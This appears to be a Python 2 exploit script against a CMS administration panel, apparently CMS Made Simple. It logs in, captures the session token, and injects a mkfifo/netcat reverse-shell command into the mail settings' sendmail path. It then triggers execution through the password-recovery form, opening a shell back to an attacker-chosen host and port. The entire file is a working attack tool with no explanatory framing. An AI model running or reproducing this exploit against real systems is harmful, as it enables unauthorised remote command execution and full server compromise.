import requests
import optparse
import socket

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (e.g. http://10.10.10.100/cms)")
parser.add_option('-U', '--username', action="store", dest="username", help="Username for login", default="admin")
parser.add_option('-P', '--password', action="store", dest="password", help="Password for login", default="password")
parser.add_option('-l', '--local', action="store", dest="local", help="Local uri", default="localhost")
parser.add_option('-p', '--port', action="store", dest="port", help="Local port", default="2222")
options, args = parser.parse_args()

if not options.url:
    print "[+] Specify an uri target"
    exit()

if not options.username:
    print "[-] Specify an username for login in administrator panel"
    exit()

if not options.password:
    print "[-] Specify a password for login in administrator panel"
    exit()

base_uri = options.url
url_panel_main = base_uri + "/admin/siteprefs.php"
url_recovery_password = base_uri + "/admin/login.php?forgotpw=1"
url_login = base_uri + "/admin/login.php"
user = options.username
password = options.password
session = requests.Session()
__c_var = ""
lhost = options.local
lport = options.port

def login(username, password):
    print "[+] Login to cms"
    global __c_var
    credentials = {"username": username, "password": password, "loginsubmit": "Submit"}
    response = session.post(url_login, data=credentials, allow_redirects=False)
    __c_var = response.headers['Location'].split("__c=")[1]
    print "[+] Token value: " + __c_var

def load_shell():
    print "[+] Send payload.."
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    payload = {
        "__c": __c_var,
        "active_tab": "mail",
        "editsiteprefs": "true",
        "mailprefs_mailer": "sendmail",
        "mailprefs_from": "root@localhost.localdomain",
        "mailprefs_fromuser": "CMS Administrator",
        "mailprefs_sendmail": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + lhost + " " + lport + " >/tmp/f",#"wget " + lhost + ":" + lport + " #", #insert here your CMD
        "submit": "Submit"
    }
    response = session.post(url_panel_main + "?" + __c_var, data=payload, allow_redirects=False)
    print "[+] Payload sended!"

def spawn_shell():
    print "[+] Spawn a shell"
    global user
    payload = {"forgottenusername": user,"forgotpwform":"1", "loginsubmit":"Submit"}
    requests.post(url_recovery_password, data=payload)

login(user, password)
load_shell()
spawn_shell()
